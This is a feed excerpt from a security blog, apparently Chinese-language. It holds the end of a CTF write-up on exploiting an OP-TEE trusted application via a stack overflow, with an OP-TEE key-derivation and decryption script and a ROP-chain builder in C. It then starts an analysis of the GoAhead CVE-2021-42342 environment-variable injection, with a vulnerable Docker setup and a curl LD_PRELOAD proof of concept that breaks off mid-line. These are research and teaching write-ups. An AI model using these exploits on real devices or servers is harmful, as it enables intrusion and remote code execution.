class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> HMAC, SHA256</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment">#计算ssk</span></span><br><span class="line">    huk = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">16</span></span><br><span class="line">    chip_id = <span class="string">b&#x27;BEEF&#x27;</span> * <span class="number">8</span></span><br><span class="line">    print(chip_id)</span><br><span class="line">    ssk_str = <span class="string">b&#x27;ONLY_FOR_tee_fs_ssk\x00&#x27;</span></span><br><span class="line">    m = HMAC.new(huk, digestmod=SHA256)</span><br><span class="line">    m.update(chip_id)</span><br><span class="line">    m.update(ssk_str)</span><br><span class="line">    ssk = m.digest()</span><br><span class="line">    print(ssk)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#计算tsk</span></span><br><span class="line">    ta_uuid = <span class="string">b&#x27;\xbb\x50\xe7\xf4\x37\x14\xbf\x4f\x87\x85\x8d\x35\x80\xc3\x49\x94&#x27;</span> <span class="comment">#ta的uuid</span></span><br><span class="line">    m = HMAC.new(ssk, digestmod=SHA256)</span><br><span class="line">    m.update(ta_uuid)</span><br><span class="line">    tsk = m.digest()</span><br><span class="line">    print(tsk)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#解fek</span></span><br><span class="line">    enc_fek = <span class="string">b&#x27;\xe4\x9a\x95\xf2\xb5\xf4\x9c\x04\xf6\x07\x9f\xfb\xf0\x2e\xd2\xef&#x27;</span>  <span class="comment">#2在header里</span></span><br><span class="line">    cipher = AES.new(tsk, AES.MODE_ECB)</span><br><span class="line">    fek = cipher.decrypt(enc_fek)</span><br><span class="line">    print(fek)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#解数据</span></span><br><span class="line">    enc_data = <span class="string">b&#x27;....&#x27;</span></span><br><span class="line">    iv = <span class="string">b&#x27;\xb4\xc9\x6a\x22\xe6\x36\x72\xcf\x6a\x44\x8f\x10\xa3\x11\x44\x68&#x27;</span> <span class="comment">#对应node</span></span><br><span class="line">    cipher = AES.new(fek, AES.MODE_GCM, nonce=iv)</span><br><span class="line">    data = cipher.decrypt(enc_data)</span><br><span class="line">    print(data)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="UnTrustZone"><a href="#UnTrustZone" class="headerlink" title="UnTrustZone"></a>UnTrustZone</h3><p>题目描述</p><blockquote><p>UntrustZone</p><p>Score: <em>500</em></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Pwn&#96;, &#96;difficulty:normal</span><br></pre></td></tr></table></figure><p>It is clearly not worth your trust.</p><p>The default username is root.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 47.243.205.105 8899</span><br></pre></td></tr></table></figure><p><a href="https://realworldctf-attachment.oss-accelerate.aliyuncs.com/UnstrustZone_d9d2151c29fa340f80f38197492001fe.tar.gz">attachment</a></p></blockquote><h4 id="TL-DR-1"><a href="#TL-DR-1" class="headerlink" title="TL;DR"></a>TL;DR</h4><p>这个题需要补充一些关于 <code>TrustZone</code> 的另外一部分关于 <code>TA</code>和<code>CA</code>的前置知识。 <code>TA</code> 是 Trusted Application 的缩写，通常运行在 TEE 环境下的应用简称为<code> TA</code>。<code>CA</code> 是 Client Application 的缩写，通常运行在 REE 环境下的应用简称为 CA。</p><p>一个访问安全OS的服务流程为：打开 TEE 环境 &gt; 开启一个会话 &gt; 发送命令 &gt; 获取信息 &gt; 结束会话 &gt; 关闭 TEE 环境。</p><p>借助OP-TEE来实现特定安全需求时，一次完整的功能调用一般都是起源于CA，TA做具体功能实现并返回数据到CA，而整个过程需要经过OP-TEE的client端接口，OP-TEE在Linux kernel端的驱动，Monitor模式下的SMC处理，OP-TEE OS的thread处理，OP-TEE中的TA程序运行，OP-TEE端底层库或者硬件资源支持等几个阶段。当TA执行完具体请求之后会按照原路径将得到的数据返回给CA。</p><h4 id="Ideas-1"><a href="#Ideas-1" class="headerlink" title="Ideas"></a>Ideas</h4><p>设计这个题目的时候，就只是想让选手了解下 <code>TA</code> 这个攻击面，所以漏洞设计的得特别简单，就是一个在<code>TA</code>中的栈溢出，我修改了附件中的<code>HUK</code>和签名时候的 key 让他保持于远程的不一致。希望选手通过 Pwn 这个 TA， 来获取 安全存储，即 <code>/data/tee/2</code> 下被加密的 flag 。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">data_sz = params[<span class="number">1</span>].memref.size;</span><br><span class="line"><span class="comment">// data = TEE_Malloc(data_sz, 0); patch for challenge</span></span><br><span class="line"><span class="keyword">char</span> data[<span class="number">0x20</span>] ;</span><br><span class="line"><span class="keyword">if</span> (!data)</span><br><span class="line"><span class="keyword">return</span> TEE_ERROR_OUT_OF_MEMORY;</span><br><span class="line">TEE_MemMove(data, params[<span class="number">1</span>].memref.buffer, data_sz);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h5><p>参考： <a href="https://github.com/ForgeRock/optee-build/blob/master/docs/debug.md#debugging-op-tee">optee-build/debug.md at master · ForgeRock/optee-build (github.com)</a></p><ul><li>有 源码调试：</li></ul><p>首先对 ldelf 的入口下断， <code>b thread_enter_user_mode</code></p><p>然后执行 CA 程序，在 LOG 窗口中找到 TA 的加载地址<br><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202112311553854.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202112311553854.png"></a></p><p>然后对 TA 入口下断， <code>b *(baseaddr + TA_InvokeCommandEntryPoint_addr</code></p><ul><li><p>无源码调试</p><p>OP-TEE 有日志功能，在日志功能中能看到 TA 的加载地址，可以通过这个进行调试</p></li></ul><h5 id="内存布局"><a href="#内存布局" class="headerlink" title="内存布局"></a>内存布局</h5><table><thead><tr><th>Text Address</th><th>File Name</th><th>Description</th></tr></thead><tbody><tr><td>0x0</td><td>bl1.elf</td><td>ARM Trusted Firmware Boot Loader Stage 1</td></tr><tr><td>0x1070</td><td>libteec.so</td><td>OP-TEE Client Shared Library [Normal World]</td></tr><tr><td>0x4009c0</td><td><CA></td><td>Client Application [Normal World]</td></tr><tr><td>0xe01b000</td><td>bl2.elf</td><td>ARM Trusted Firmware Boot Loader Stage 2</td></tr><tr><td>0xe040000</td><td>bl31.elf</td><td>ARM Trusted Firmware Boot Loader Stage 3-1</td></tr><tr><td>0xe100000</td><td>tee.elf</td><td>OP-TEE</td></tr><tr><td>0xffff000008081000</td><td>vmlinux</td><td>Linux Kernel [Normal World]</td></tr></tbody></table><ul><li>usermod</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">user mode内存布局</span><br><span class="line">E&#x2F;LD:  region  0: va 0x40004000 pa 0x0e300000 size 0x002000 flags rw-s (ldelf)</span><br><span class="line">E&#x2F;LD:  region  1: va 0x40006000 pa 0x0e302000 size 0x008000 flags r-xs (ldelf)</span><br><span class="line">E&#x2F;LD:  region  2: va 0x4000e000 pa 0x0e30a000 size 0x001000 flags rw-s (ldelf)</span><br><span class="line">E&#x2F;LD:  region  3: va 0x4000f000 pa 0x0e30b000 size 0x004000 flags rw-s (ldelf)</span><br><span class="line">E&#x2F;LD:  region  4: va 0x40013000 pa 0x0e30f000 size 0x001000 flags r--s</span><br><span class="line">E&#x2F;LD:  region  5: va 0x40014000 pa 0x0e32e000 size 0x001000 flags rw-s (stack)</span><br><span class="line">E&#x2F;LD:  region  6: va 0x40015000 pa 0x5f60a888 size 0x001000 flags rw-- (param)</span><br><span class="line">E&#x2F;LD:  region  7: va 0x4004d000 pa 0x00001000 size 0x012000 flags r-xs [0]</span><br><span class="line"> &#x2F;&#x2F;随机 </span><br><span class="line">E&#x2F;LD:  region  8: va 0x4005f000 pa 0x00013000 size 0x00c000 flags rw-s [0]</span><br><span class="line"> &#x2F;&#x2F;随机</span><br></pre></td></tr></table></figure><p>一般而言： ldelf  加载地址是固定的， 处理代码位于 <code> build/optee*os/core/arch/arm/kernel/ldelf_loader.c</code></p><p><code>ldelf_load_ldelf</code> 函数中， 最后加载的base为  0x40006000, 具体代码可见<code>build/optee_os/core/arch/arm/kernel/ldelf_loader.c</code></p><h4 id="Solved-1"><a href="#Solved-1" class="headerlink" title="Solved"></a>Solved</h4><p>解题关键是需要了解没法直接解密的时候，我们应该如何读取 flag：</p><ol><li>TEE_AllocatePersistentObjectEnumerator</li><li>TEE_GetNextPersistentObject</li><li>TEE_OpenPersistentObject</li><li>TEE_ReadObjectData</li><li>memcpy data to buffer</li></ol><p>首先， <code>ldefl</code> 加载基地址是不变的，我们可以在这上边找 gadget ， 另外虽然 <code>TA</code>有随机化，但是这随机化并不是很高，可以通过爆破解决。所以 <code>TA</code> 的程序也是找 gadget 的目标之一。ldefl 程序的代码段是被通过 <code>ldelf_load_ldelf</code> 函数是写死在 <code>bl32_extra1.bin</code>中的。</p><p>最后我们找到的了几个可以设置 5 个参数的 gadget。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">CallFun5</span><span class="params">(TEEC_Session* sess,<span class="keyword">uint64_t</span> func,<span class="keyword">uint64_t</span> x0,<span class="keyword">uint64_t</span> x1,<span class="keyword">uint64_t</span> x2,<span class="keyword">uint64_t</span> x3,<span class="keyword">uint64_t</span> x4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//存放返回内存的地址在：g_ta_addr+124D8</span></span><br><span class="line"><span class="comment">//返回地址0x00000000400152b0</span></span><br><span class="line">payload = (<span class="keyword">uint8_t</span>*)<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"><span class="built_in">memset</span>(payload,<span class="number">0</span>,<span class="number">0x1000</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(payload,tmp,<span class="keyword">sizeof</span>(tmp));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;tmplen 0x%lx \n&quot;</span>,<span class="keyword">sizeof</span>(tmp));</span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">48</span>) = <span class="number">0x40015150</span>;  <span class="comment">//next x19</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">56</span>) = <span class="number">0x40004008</span>;  <span class="comment">//next x20</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">40</span>) = <span class="number">0x40006000</span>+<span class="number">0x0000000000003a28</span>; <span class="comment">//next pc</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">672</span>) = x1 &amp; <span class="number">0xFFFFFFFFFFFFF000</span>; <span class="comment">//next x1  [x19+0x10]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//x1 == [x19+0x10]</span></span><br><span class="line"><span class="comment">//0x0000000000003a28: ldr x1, [x19, #0x10]; add x0, x0, x1; str x0, [x20]; ldp x19, x20, [sp, #0x10]; ldp x29, x30, [sp], #0x40; ret;</span></span><br><span class="line">*(<span class="keyword">uint32_t</span>*)(payload+<span class="number">108</span>) = <span class="number">0x40015777</span>; <span class="comment">//next 19</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">112</span>) = <span class="number">0x40014ff8</span>; <span class="comment">//next 20</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">64</span>) = <span class="number">0x40004010</span>; <span class="comment">//next x21</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">184</span>) = <span class="number">0x40006000</span>+<span class="number">0x0000000000000C40</span>; <span class="comment">//next pc</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">344</span>) = x2; <span class="comment">//next x2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//x2 = [SP,#0x70+va]</span></span><br><span class="line"><span class="comment">//0x0000000000000C40 E2 37 40 F9                                   LDR             X2, [SP,#0x70+va]</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">112</span>+<span class="number">0x38</span>) = <span class="number">0x40015150</span>; <span class="comment">//next x19</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">272</span>) = <span class="number">0x40004070</span>; <span class="comment">//next x21</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">304</span>) = <span class="number">0</span>; <span class="comment">//next x25</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">160</span>) = <span class="number">0x40006000</span>+<span class="number">0x0000000000000EE0</span>; <span class="comment">//next pc</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">672</span>+<span class="number">8</span>) = x0; <span class="comment">//next x0 [x19 + 0x18]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//x0 = [x19 + 0x18]</span></span><br><span class="line"><span class="comment">//text:0000000000000EE0 60 0E 40 F9                                   LDR             X0, [elf,#0x18] </span></span><br><span class="line"><span class="comment">//*(uint64_t*)(payload+360) = 0x40006000+0x000000000000064C;//next pc</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">432</span>) = x1; <span class="comment">//next x27</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">440</span>) = x3; <span class="comment">//next x28</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">360</span>) = g_ta_addr+<span class="number">0x000000000000aa00</span>;<span class="comment">//next pc</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//x3 == x28  x1 == x27</span></span><br><span class="line"><span class="comment">//0x000000000000aa00 : mov x3, x28 ; csel x21, x21, x2, ne ; mov x1, x27 ; mov x2, x21 ; str x24, [sp, #0x78] ; blr x23</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">400</span>) = <span class="number">0x40006000</span>+<span class="number">0x0000000000001f98</span>;<span class="comment">//next x23 next pc</span></span><br><span class="line"><span class="comment">//x21 == [sp, #0x20]</span></span><br><span class="line"><span class="comment">//0x0000000000001f98 : ldp x21, x22, [sp, #0x20] ; ldp x29, x30, [sp], #0x30 ; ret</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">376</span>) = <span class="number">0x40015170</span>; <span class="comment">//next x20</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">496</span>) = <span class="number">0x40015180</span>; <span class="comment">//next x21</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">472</span>) = g_ta_addr + <span class="number">0x0000000000005fa4</span>; <span class="comment">//next pc</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">696</span>) = x4; <span class="comment">//next x4 == [x20, #8]</span></span><br><span class="line"><span class="comment">//x4 == [x20, #8]</span></span><br><span class="line"><span class="comment">//x1 == [x21, #8]</span></span><br><span class="line"><span class="comment">//0x0000000000005fa4 : ldr x4, [x20, #8] ; ldr x0, [x21, #8] ; cmp x4, x0 ; b.hi #0x5fc8 ; mov w0, w9 ; ldp x19, x20, [sp, #0x10] ; ldr x21, [sp, #0x20] ; ldp x29, x30, [sp], #0x30 ; ret</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">528</span>) = <span class="number">0x40015180</span>; <span class="comment">//next x19</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">544</span>) = <span class="number">0x40004070</span>; <span class="comment">//next x21</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">416</span>) = <span class="number">0xFFFFFFFFFFFFF001</span>; <span class="comment">//next x25</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">520</span>) = <span class="number">0x40006000</span>+<span class="number">0x0000000000000EE0</span>; <span class="comment">//next pc</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">728</span>) = x0; <span class="comment">//next x0 [x19 + 0x18]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//text:0000000000000EE0 60 0E 40 F9                                   LDR             X0, [elf,#0x18] </span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">568</span>) = func;<span class="comment">//0x40006000+0x000000000000064C;//next pc</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.daimajiaoliu.com/daima/4872449c3100404">OP-TEE中secure stroage——安全存储使用的key的产生 (daimajiaoliu.com)</a></p><p><a href="https://optee.readthedocs.io/en/latest/">OP-TEE Documentation — OP-TEE documentation documentation (optee.readthedocs.io)</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="Writeup" scheme="https://bestwing.me/categories/Writeup/"/>
    
    
    <category term="pwn" scheme="https://bestwing.me/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2021-42342 Goahead 环境变量注入漏洞分析</title>
    <link href="https://bestwing.me/CVE-2021-42342-Goahead.html"/>
    <id>https://bestwing.me/CVE-2021-42342-Goahead.html</id>
    <published>2022-01-09T16:00:00.000Z</published>
    <updated>2022-04-02T15:05:14.812Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="漏洞背景"><a href="#漏洞背景" class="headerlink" title="漏洞背景"></a>漏洞背景</h2><p>近日爆出GoAhead存在RCE漏洞（实际来源于 PBCTF 的一道题目），漏洞源于文件上传过滤器的处理缺陷，当与CGI处理程序一起使用时，可影响环境变量，从而导致RCE。漏洞影响版本为：</p><ul><li>GoAhead =4.x</li><li>5.x&lt;=GoAhead&lt;5.1.5</li></ul><p>我为啥看这个漏洞呢？是因为 phith0n 师傅发了一篇复现踩坑记， 我对其中一块 文件描述符找不到的解决过程比较感兴趣。于是和 @leommxj 一起看了下。然后简单记录了下这些过程，比较简略。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>参考 phith0n 的文章： <a href="https://tttang.com/archive/1399/">GoAhead环境变量注入复现踩坑记 - 跳跳糖 (tttang.com)</a></p><p>Dockerfile 如下</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> beswing/swpwn:<span class="number">18.04</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> <span class="built_in">set</span> -ex \</span></span><br><span class="line"><span class="bash">    &amp;&amp; apt-get update \</span></span><br><span class="line"><span class="bash">    &amp;&amp; apt-get install wget make gcc -y \</span></span><br><span class="line"><span class="bash">    &amp;&amp; wget -qO- https://github.com/embedthis/goahead/archive/refs/tags/v5.1.4.tar.gz | tar zx --strip-components 1 -C /usr/src/ \</span></span><br><span class="line"><span class="bash">    &amp;&amp; <span class="built_in">cd</span> /usr/src \</span></span><br><span class="line"><span class="bash">    &amp;&amp; make SHOW=1 ME_GOAHEAD_UPLOAD_DIR=<span class="string">&quot;&#x27;\&quot;/tmp\&quot;&#x27;&quot;</span> \</span></span><br><span class="line"><span class="bash">    &amp;&amp; make install \</span></span><br><span class="line"><span class="bash">    &amp;&amp; cp src/self.key src/self.crt /etc/goahead/ \</span></span><br><span class="line"><span class="bash">    &amp;&amp; mkdir -p /var/www/goahead/cgi-bin/ \</span></span><br><span class="line"><span class="bash">    &amp;&amp; apt-get purge -y --auto-remove wget make gcc \</span></span><br><span class="line"><span class="bash">    &amp;&amp; <span class="built_in">cd</span> /var/www/goahead \</span></span><br><span class="line"><span class="bash">    &amp;&amp; sed -e <span class="string">&#x27;s!^# route uri=/cgi-bin dir=cgi-bin handler=cgi$!route uri=/cgi-bin dir=/var/www/goahead handler=cgi!&#x27;</span> -i /etc/goahead/route.txt</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">80</span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> [<span class="string">&quot;goahead&quot;</span>, <span class="string">&quot;-v&quot;</span>, <span class="string">&quot;--home&quot;</span>, <span class="string">&quot;/etc/goahead&quot;</span>, <span class="string">&quot;/var/www/goahead&quot;</span>]</span></span><br></pre></td></tr></table></figure><blockquote><p>这也是这个漏洞的第一个坑：<strong>新版本的GoAhead默认没有开启CGI配置，而老版本如果没有cgi-bin目录，或者里面没有cgi文件，也不受这个漏洞影响。</strong>所以并不像某些文章里说的那样影响广泛。</p></blockquote><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><h4 id="HTTP-请求流程"><a href="#HTTP-请求流程" class="headerlink" title="HTTP 请求流程"></a>HTTP 请求流程</h4><p>调用栈如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#1  0x00007f44624fc11d in cgiHandler (wp&#x3D;0x55e66c994790) at src&#x2F;cgi.c:216</span><br><span class="line">#2  0x00007f446250e44b in websRunRequest (wp&#x3D;0x55e66c994790) at src&#x2F;route.c:182</span><br><span class="line">#3  0x00007f446250152c in websPump (wp&#x3D;0x55e66c994790) at src&#x2F;http.c:870</span><br><span class="line">#4  0x00007f44625013b9 in readEvent (wp&#x3D;0x55e66c994790) at src&#x2F;http.c:834</span><br><span class="line">#5  0x00007f4462501142 in socketEvent (sid&#x3D;2, mask&#x3D;2, wptr&#x3D;0x55e66c994790) at src&#x2F;http.c:772</span><br><span class="line">#6  0x00007f4462516dbf in socketDoEvent (sp&#x3D;0x55e66c994650) at src&#x2F;socket.c:654</span><br><span class="line">#7  0x00007f4462516ce5 in socketProcess () at src&#x2F;socket.c:628</span><br><span class="line">#8  0x00007f4462502f34 in websServiceEvents (finished&#x3D;0x55e66aa02014 &lt;finished&gt;) at src&#x2F;http.c:1385</span><br><span class="line">#9  0x000055e66a8005cf in main (argc&#x3D;5, argv&#x3D;0x7fff507b50c8, envp&#x3D;0x7fff507b50f8) at src&#x2F;goahead.c:170</span><br></pre></td></tr></table></figure><p>整个<code>goahead</code>处理<code>cgi</code>所对应<code>post</code>请求处理流程小结如下：</p><ol><li><p>调用<code>websRead</code>函数，所有数据保存到了wp-&gt;rxbuf中。</p></li><li><p>调用</p><p><code>websPump</code></p><p>，该函数包含三部分：</p><ol><li>调用<code>parseIncoming</code>函数解析请求头以及调用<code>websRouteRequest</code>确定相应的处理函数。</li><li>调用<code>processContent</code>将处理post数据，将其保存到tmp文件中。</li><li>调用<code>websRunRequest</code>函数，调用相应的处理函数，cgi对应为<code>cgiHandler</code>。</li></ol></li><li><p>调用<code>cgiHandler</code>，将请求头以及get参数设置到环境变量中，调用<code>launchCgi</code>函数。</p></li><li><p>调用<code>launchCgi</code>函数，将标准输出输入重定向到文件句柄，调用<code>execve</code>启动cgi进程。</p></li></ol><h4 id="根本原因（Root-cause）"><a href="#根本原因（Root-cause）" class="headerlink" title="根本原因（Root cause）"></a>根本原因（Root cause）</h4><ol><li><code>strim</code> 函数的错误使用</li></ol><p>strim 函数定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">PUBLIC <span class="keyword">char</span> *<span class="title">strim</span><span class="params">(<span class="keyword">char</span> *str, cchar *<span class="built_in">set</span>, <span class="keyword">int</span> where)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>    *s;</span><br><span class="line">    ssize   len, i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (str == <span class="number">0</span> || <span class="built_in">set</span> == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">    s = (<span class="keyword">char</span>*) &amp;str[i];</span><br><span class="line">    <span class="keyword">if</span> (where &amp; WEBS_TRIM_END) &#123;</span><br><span class="line">...</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当第二个参数为 0 的时候， 直接返回 0 。然而 goahead 的 cgi.c:176 行代码是这样使用的</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201101526090.png" title="image-20220110152602890" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201101526090.png" alt="image-20220110152602890"></a></p><p>那么此处 vp 的 值为 0 ， 因此后续的 smatch 判断都毫无意义。 另外我们注意到 182 和 186 行都是设置环境变量， 然而 183 行处会拼接 <code>CGI_</code> 到字符， 因此不是我们漏洞利用的目标。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ME_GOAHEAD_CGI_VAR_PREFIX <span class="meta-string">&quot;CGI_&quot;</span></span></span><br></pre></td></tr></table></figure><p>因此我们需要走到 186 行代码，需要 <code>s-&gt;arg</code> 为 0 即可（初始化状态为<code>0</code>）</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>需要在Body中发送multipart表单，然后在劫持环境变量。 PoC 如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -vv -F data=@poc.so -F <span class="string">&quot;LD_PRELOAD=/proc/self/fd/7&quot;</span> 